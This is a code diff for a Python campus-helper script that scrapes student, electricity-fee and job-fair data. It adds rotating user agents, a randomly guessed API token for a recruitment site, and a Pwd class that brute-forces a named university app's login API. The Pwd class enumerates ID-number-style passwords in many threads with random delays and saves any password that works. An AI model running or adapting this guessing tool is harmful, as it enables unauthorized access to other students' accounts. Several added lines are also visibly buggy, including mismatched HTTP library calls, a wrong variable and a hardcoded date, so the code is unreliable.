@@ -1,3 +1,4 @@
+# !/bin/python3
 # -*- coding=utf-8 -*-
 
 
@@ -7,9 +8,12 @@ API 列表来源： https://github.com/TLingC/QZAPI_Archive
 
 import json
 import os
+import sys
+import gzip
+import random
 import sqlite3
 import threading
-# mport sys
+import traceback
 import time
 import uuid
 from datetime import datetime, timedelta
@@ -45,14 +49,43 @@ from icalendar import Calendar, Event
 #     if "password" not in locals().keys():
 #         self.password = getpass.getpass("请输入密码（无回显）：")
 
+UserAgent = (
+    ('Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) '
+        'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 '
+        'Chrome/67.0.3396.87 XWEB/882 MMWEBSDK/190503 '
+        'Mobile Safari/537.36 MMWEBID/443 '
+        'MicroMessenger/7.0.5.1440(0x27000536) '
+        'Process/tools NetType/4G Language/zh_CN '
+        'MicroMessenger/7.0.5.1440(0x27000536) '
+        'Process/tools NetType/4G Language/zh_CN miniProgram'),
+    ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) '
+        'AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A'),
+    ('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) '
+        'AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25'),
+    ('Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; zh-cn) '
+        'AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27'),
+    ('Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_1 like Mac OS X; zh-cn) '
+        'AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5'),
+    ('Mozilla/5.0 (X11; U; Linux x86_64; en-us) '
+        'AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/531.2+'),
+    ('Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) '
+        'AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1'),
+    ('Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) '
+        'AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10'),
+    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+        'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'),
+    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+        'AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931')
+)
 
-class SqliteDb(object):
+
+class Stu_SqliteDb(object):
     def __init__(self, filename='HUT.db'):
         self.conn = sqlite3.connect(filename)
         print("Opened database successfully")
         self.cur = self.conn.cursor()
         try:
-            self.cur.execute('''CREATE TABLE STUDENT
+            self.cur.execute('''CREATE TABLE IF NOT EXISTS STUDENT
                     (ID INTEGER PRIMARY KEY AUTOINCREMENT,
                     RXNF        CHAR(5),
                     NJ          CHAR(5),
@@ -68,8 +101,8 @@ class SqliteDb(object):
                     ''')
             print("Table created successfully")
             self.conn.commit()
-        except sqlite3.OperationalError as err:
-            print(err)
+        except sqlite3.OperationalError:
+            traceback.print_exc()
             # sys.exit(0)
 
     def insert(self, data):
@@ -113,14 +146,7 @@ class Student(object):
         self.session = self.login()
 
     HEADERS = {
-        'User-Agent': ('Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) '
-                       'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 '
-                       'Chrome/67.0.3396.87 XWEB/882 MMWEBSDK/190503 '
-                       'Mobile Safari/537.36 MMWEBID/443 '
-                       'MicroMessenger/7.0.5.1440(0x27000536) '
-                       'Process/tools NetType/4G Language/zh_CN '
-                       'MicroMessenger/7.0.5.1440(0x27000536) '
-                       'Process/tools NetType/4G Language/zh_CN miniProgram'),
+        'User-Agent': random.choice(UserAgent),
         'Referer': 'http://218.75.197.123:83',
         'accept-encoding': 'gzip, deflate, br'
     }
@@ -172,9 +198,9 @@ class Student(object):
                                    timeout=5, headers=self.HEADERS)
             # print(res.text)
             res = res.json()
-        except Exception as err:
+        except requests.exceptions.ConnectTimeout:
+            traceback.print_exc()
             time.sleep(1)
-            print(err)
         return res
 
     def get_current_time(self):
@@ -826,10 +852,10 @@ class ElectricityFeeInquiry(object):
                         break
                     else:
                         self.payProId = randint(1000, 1500)
+            except requests.exceptions.ConnectTimeout:
+                traceback.print_exc()
                 time.sleep(2)
-            except requests.exceptions.ConnectTimeout as err:
-                print(err)
-        print(req.url)
+        # print(req.url)
         return res
 
     def getJzinfo(self, optype=1, arieaid=4, buildid=0, levelid=0):
@@ -853,26 +879,42 @@ class ElectricityFeeInquiry(object):
 
 
 class JobCalendar(object):
-    HOST = 'http://job.hut.edu.cn/module/'
-    CAREER_INFO_HOST = 'http://job.hut.edu.cn/detail/career?id='
-    # CAREER_INFO_HOST = 'http://static.bibibi.net/student/chance/preachmeetingdetails.html?token=yxqqnn0000000012&career_id='
-    CAREER_INFO_API_HOST = 'http://student.bibibi.net/index.php?r=career/ajaxgetcareerdetail&token=yxqqnn0000000012&career_id='
-    FAIR_INFO_HOST = 'http://job.hut.edu.cn/detail/jobfair?id='
-    # FAIR_INFO_HOST = 'https://m.bysjy.com.cn/student/chance/largemeetingdetails.html?token=yxqqnn0000000012&fair_id='
-    FAIR_INFO_API_HOST = 'https://s.bysjy.com.cn/index.php?r=chance/ajaxgetjobfairdetail&token=yxqqnn0000000012&fair_id='
+    '''
+        学校列表：http://bibibi.net/tour/admin/tag/hzgx.htm
+    '''
+
+    school_list = {'jndx': "暨南大学", 'hndx': "湖南大学", 'xtdx': "湘潭大学",
+                   'cslg': "长沙理工大学", 'hngydx': "湖南工业大学", 'nhdx': "南华大学",
+                   'hnkjdx': "湖南科技大学", 'hnnydx': "华南农业大学", 'nfykdx': "南方医科大学",
+                   'nfkjdx': "南方科技大学", 'gdcj': '广东财经大学', 'ccgydx': "长春工业大学",
+                   'cczyy': "长春中医药大学", 'cccjxy': "长春财经学院", 'bhdx': "北华大学",
+                   'jlcjdx': "吉林财经大学", 'thsfxy': "通化师范学院", 'lndx': "辽宁大学",
+                   'zgyk': "中国医科大学", 'gzdxhrrjxy': "广州大学华软软件学院",
+                   'sygy': "沈阳工业大学", 'sysf': "沈阳师范大学", 'lnzyxy': "辽宁职业学院",
+                   'kmlg': "昆明理工大学", 'ynmzdx': "云南名族大学", 'ynnd': "云南农业大学",
+                   'xnly': "西南林业大学", 'yncjdx': "云南财经大学", 'kmykdx': "昆明医科大学",
+                   'jxny': "江西农业大学", 'jxcj': "江西财经大学", 'jxwywmzy': "江西外语外贸职业学院",
+                   'yjlgxy': "燕京理工学院", 'kdxy': "首都师范大学科德学院", 'bjgsjhxy': "北京工商大学嘉华学院"
+                   }
+    TOKEN = 'yxqqnn0000000' + str(randint(0, 135)).zfill(3)
+
     HEADERS = {
-        'User-Agent': ('Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) '
-                       'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 '
-                       'Chrome/67.0.3396.87 XWEB/882 MMWEBSDK/190503 '
-                       'Mobile Safari/537.36 MMWEBID/443 '
-                       'MicroMessenger/7.0.5.1440(0x27000536) '
-                       'Process/tools NetType/4G Language/zh_CN '
-                       'MicroMessenger/7.0.5.1440(0x27000536) '),
+        'Host': 'bibibi.net',
+        'User-Agent': random.choice(UserAgent)
     }
 
-    def __init__(self, suffix='getcareers', m=14):
-        self.suffix = suffix
-        self.url = self.HOST + suffix
+    def __init__(self, school='hngydx', mode='getcareers', m=14, style='simple'):
+        self.HOST = '{school_name}.bibibi.net'.format(school_name=school if(school in self.school_list.keys()) else 'hngydx')
+        self.HEADERS['Host'] = self.HOST
+        self.CAREER_INFO_URL = 'http://' + self.HOST + '/detail/career?id='
+        self.CAREER_INFO_API_URL = 'http://student.bibibi.net/index.php?r=career/ajaxgetcareerdetail&token={TOKEN}&career_id='.format(TOKEN=self.TOKEN)
+        self.FAIR_INFO_URL = 'http://' + self.HOST + '/detail/jobfair?id='
+        self.FAIR_INFO_API_URL = 'https://student.bibibi.net/index.php?r=chance/ajaxgetjobfairdetail&token={TOKEN}&fair_id='.format(TOKEN=self.TOKEN)
+
+        self.mode = mode
+        self.style = style
+        self.url = 'http://' + self.HOST + '/module/' + mode
+
         self.dates = []
         for i in range(m):
             self.dates.append(datetime.strftime(
@@ -888,22 +930,22 @@ class JobCalendar(object):
             'address': kwargs['address'] if('address' in kwargs.keys()) else '',
             'type': kwargs['type'] if('type' in kwargs.keys()) else 'inner'
         }
-        if(self.suffix == 'getcareers'):
+        if(self.mode == 'getcareers'):
             params['professionals'] = kwargs['professionals'] if(
                 'professionals' in kwargs.keys()) else ''
             params['career_type'] = kwargs['career_type'] if(
                 'career_type' in kwargs.keys()) else ''
-            self.HEADERS['Referer'] = 'http://job.hut.edu.cn/module/careers'
+            self.HEADERS['Referer'] = 'http://{HOST}/module/careers'.format(HOST=self.HOST)
         else:
             params['organisers'] = kwargs['organisers'] if(
                 'organisers' in kwargs.keys()) else ''
             params['type'] = None if(params['type'] == 'inner') else 2
-            self.HEADERS['Referer'] = 'http://job.hut.edu.cn/module/jobfairs'
+            self.HEADERS['Referer'] = 'http://{HOST}/module/jobfairs'.format(HOST=self.HOST)
 
         datas = []
         # print(self.dates)
         for date in self.dates:
-            params['day'] = date
+            params['day'] = '2020-04-07'
             while(True):
                 try:
                     # s = self.session.get(
@@ -914,20 +956,24 @@ class JobCalendar(object):
                     t.join()
                     res = t.get_result()
                     # print(res.url)
+                    if(res.status_code != 200):
+                        break
                     res = res.json()
                     # print('>' * 50)
                     # print(res)
                     if(res['data']):
                         for data in res['data']:
-                            if(self.suffix == 'getcareers'):
-                                res = self.session.get(
-                                    self.CAREER_INFO_API_HOST + data['career_talk_id'])
+                            if(self.mode == 'getcareers' and self.style != 'simple'):
+                                career_res = self.session.get(
+                                    self.CAREER_INFO_API_URL + data['career_talk_id'])
+                                career_res = career_res.json()
+                                data['remark'] = career_res['data']['remark']
                             else:
-                                res = self.session.get(
-                                    self.FAIR_INFO_API_HOST + data['fair_id'])
-                                res = res.json()
+                                fair_res = self.session.get(
+                                    self.FAIR_INFO_API_URL + data['fair_id'])
+                                fair_res = res.json()
                                 companys = []
-                                for job in res['data']['job_list']:
+                                for job in fair_res['data']['job_list']:
                                     if(job['company_name'] not in companys):
                                         companys.append(job['company_name'])
                                 company_str = ', '.join(companys)
@@ -935,8 +981,8 @@ class JobCalendar(object):
                             datas.append(data)
                         # time.sleep(0.5)
                     break
-                except Exception as err:
-                    print(err)
+                except requests.exceptions.ConnectTimeout:
+                    traceback.print_exc()
                     time.sleep(1)
         return datas
 
@@ -959,14 +1005,18 @@ class JobCalendar(object):
             #                             tzinfo=tz))
             event.add('UID', str(uuid.uuid1()))
             event.add('LOCATION', data['address'])
-            if(self.suffix == 'getcareers'):
+
+            if(self.mode == 'getcareers'):
                 event.add('SUMMARY', data['meet_name'])
-                event.add('DESCRIPTION', '%s %s %s\n城市：%s 点击统计：%s\n企业属性：%s 行业类别: %s\n需求专业：%s\n%s' %
-                          (data['meet_day'], data['meet_time'], data['address'],
-                           data['city_name'], data['view_count'],
-                           data['company_property'], data['industry_category'],
-                           data['professionals'],
-                           self.CAREER_INFO_HOST + data['career_talk_id']))
+                description = '%s %s %s\n城市：%s 点击统计：%s\n企业属性：%s 行业类别: %s\n需求专业：%s\n%s' % (
+                    data['meet_day'], data['meet_time'], data['address'],
+                    data['city_name'], data['view_count'],
+                    data['company_property'], data['industry_category'],
+                    data['professionals'],
+                    self.CAREER_INFO_HOST + data['career_talk_id'])
+                if(self.style == 'full'):
+                    description += '\n{remark}'.format(remark=data['remark'])
+                event.add('DESCRIPTION', description)
             else:
                 event.add('SUMMARY', data['title'])
                 event.add('DESCRIPTION', '%s %s %s\n点击统计：%s\n组织者：%s\n参会企业：%s\n%s' %
@@ -974,13 +1024,6 @@ class JobCalendar(object):
                            data['view_count'], data['organisers'], data['company_name'],
                            self.FAIR_INFO_HOST + data['fair_id']))
 
-            # parameters = {
-            #     'FREQ': 'WEEKLY',
-            #     'UNTIL': datetime(int(year), int(mon), int(day), int(sta_hour) + 2, int(sta_minu), 0,
-            #                       tzinfo=tz),
-            #     'INTERVAL': '1'
-            # }
-            # event.add('RRULE', parameters)
             cal.add_component(event)
         # s = str(cal.to_ical(), encoding='utf8')
         # print(s)
@@ -989,12 +1032,73 @@ class JobCalendar(object):
         #     f.write(str(cal.to_ical(), encoding='utf8'))
 
 
+class Pwd(object):
+    def __init__(self, user, sex=0):
+        self.user = user
+        self.pds = []
+        rg = range(0, 10)
+        for first in range(0, 4):
+            for second in rg:
+                if((first == 0) and (second == 0)):
+                    continue
+                if((first == 3) and (second == 2)):
+                    break
+                for three in rg:
+                    for four in rg:
+                        if(sex):
+                            sex_rg = (1, 3, 5, 7, 9)
+                        else:
+                            sex_rg = (0, 2, 4, 6, 8)
+                        for five in sex_rg:
+                            for six in (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'x'):
+                                num = "%s%s%s%s%s%s" % (
+                                    first, second, three, four, five, six)
+                                self.pds.append(num)
+
+    def pwd_boom(self, user, pwd):
+        url = 'https://api.huthelper.cn/api/v1/get/login/' + self.user + '/' + pwd
+        header = {
+            'Host': 'api.huthelper.cn',
+            'accept-encoding': 'gzip',
+            'user-agent': 'okhttp/3.10.0'
+        }
+        # print(time.ctime(time.time()))
+        req = requests.Request(url=url, headers=header)
+        while(True):
+            try:
+                res = requests.urlopen(req).read()
+                res = gzip.decompress(res.read()).decode('utf-8')
+                res = json.loads(res)
+                # print(res)
+                if(res['code'] == 200):
+                    print(res)
+                    print('用户: ', user, '登录成功', '\n', '密码: ', pwd)
+                    with open('success.txt', 'w') as f:
+                        f.write(pwd)
+                        sys.exit(0)
+                else:
+                    print('密码错误: ', pwd)
+                break
+            except requests.exceptions.ConnectTimeout:
+                traceback.print_exc()
+                time.sleep(2)
+        # print(time.ctime(time.time()))
+
+    def run(self):
+        for pwd in self.pds:
+            thread = threading.Thread(
+                target=self.pwd_boom, args=(self.user, pwd))
+            sleep_time = random.uniform(0.01, 1)
+            time.sleep(sleep_time)
+            thread.start()
+
+
 if __name__ == '__main__':
     # t = Student()
     # ss = t.gen_Kb_web_data(xh='18401100609')
     # s = t.getUserInfo()
-    t = ElectricityFeeInquiry()
-    s = t.getJzinfo(2, 4)
+    # t = ElectricityFeeInquiry()
+    # s = t.getJzinfo(2, 4)
     # s = CurriculumCalendar()
     # s.gen_cal()
     # t.gen_Kb_web_data(kb=t.gen_Kb_json_data())
@@ -1003,4 +1107,6 @@ if __name__ == '__main__':
     # t = ExaminationCalendar()
     # s = t.gen_cal()
     # print(t.get_datas())
+    t = JobCalendar(style='full')
+    s = t.get_datas()
     pass
